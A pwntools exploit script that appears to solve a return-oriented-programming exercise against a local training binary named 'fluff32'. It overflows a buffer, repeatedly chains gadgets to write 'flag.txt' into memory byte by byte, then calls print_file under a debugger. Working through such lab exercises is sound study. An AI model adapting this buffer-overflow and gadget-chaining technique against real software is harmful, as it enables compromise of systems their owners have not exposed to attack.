from pwn import *
from pwnlib import *

p = process("./fluff32")

buf = b'A'*44
# putting f in memory
buf += p32(0x08048527) # gadget
buf += p32(0x00000041) # edi
buf += p32(0x00000042) # esi
buf += p32(0x00000043) # ebp
buf += p32(0x00000044) # esp
buf += p32(0x00000045) # ebx
buf += p32(0x00000066) # edx
buf += p32(0x0804a018) # ecx
buf += p32(0x00000046) # eax
buf += p32(0x8048555) # ret to xchg gadget

# putting l in memory
buf += p32(0x08048527) # gadget
buf += p32(0x00000041) # edi
buf += p32(0x00000042) # esi
buf += p32(0x00000043) # ebp
buf += p32(0x00000044) # esp
buf += p32(0x00000045) # ebx
buf += p32(0x0000006c) # edx
buf += p32(0x0804a019) # ecx
buf += p32(0x00000046) # eax
buf += p32(0x8048555) # ret to xchg gadget

# putting a in memory
buf += p32(0x08048527) # gadget
buf += p32(0x00000041) # edi
buf += p32(0x00000042) # esi
buf += p32(0x00000043) # ebp
buf += p32(0x00000044) # esp
buf += p32(0x00000045) # ebx
buf += p32(0x00000061) # edx
buf += p32(0x0804a01a) # ecx
buf += p32(0x00000046) # eax
buf += p32(0x8048555) # ret to xchg gadget

# putting g in memory
buf += p32(0x08048527) # gadget
buf += p32(0x00000041) # edi
buf += p32(0x00000042) # esi
buf += p32(0x00000043) # ebp
buf += p32(0x00000044) # esp
buf += p32(0x00000045) # ebx
buf += p32(0x00000067) # edx
buf += p32(0x0804a01b) # ecx
buf += p32(0x00000046) # eax
buf += p32(0x8048555) # ret to xchg gadget

# putting . in memory
buf += p32(0x08048527) # gadget
buf += p32(0x00000041) # edi
buf += p32(0x00000042) # esi
buf += p32(0x00000043) # ebp
buf += p32(0x00000044) # esp
buf += p32(0x00000045) # ebx
buf += p32(0x0000002e) # edx
buf += p32(0x0804a01c) # ecx
buf += p32(0x00000046) # eax
buf += p32(0x8048555) # ret to xchg gadget

# putting t in memory
buf += p32(0x08048527) # gadget
buf += p32(0x00000041) # edi
buf += p32(0x00000042) # esi
buf += p32(0x00000043) # ebp
buf += p32(0x00000044) # esp
buf += p32(0x00000045) # ebx
buf += p32(0x00000074) # edx
buf += p32(0x0804a01d) # ecx
buf += p32(0x00000046) # eax
buf += p32(0x8048555) # ret to xchg gadget

# putting x in memory
buf += p32(0x08048527) # gadget
buf += p32(0x00000041) # edi
buf += p32(0x00000042) # esi
buf += p32(0x00000043) # ebp
buf += p32(0x00000044) # esp
buf += p32(0x00000045) # ebx
buf += p32(0x00000078) # edx
buf += p32(0x0804a01e) # ecx
buf += p32(0x00000046) # eax
buf += p32(0x8048555) # ret to xchg gadget

# putting t in memory
buf += p32(0x08048527) # gadget
buf += p32(0x00000041) # edi
buf += p32(0x00000042) # esi
buf += p32(0x00000043) # ebp
buf += p32(0x00000044) # esp
buf += p32(0x00000045) # ebx
buf += p32(0x00000074) # edx
buf += p32(0x0804a01f) # ecx
buf += p32(0x00000046) # eax
buf += p32(0x8048555) # ret to xchg gadget

buf += p32(0x080483d0) # call to print_file
buf += p32(0x0804a018)*3

p.recvline()
p.recvline()
p.recvline()
p.recvline()
gdb.attach(p)
p.sendline(buf)
p.interactive()
p.close()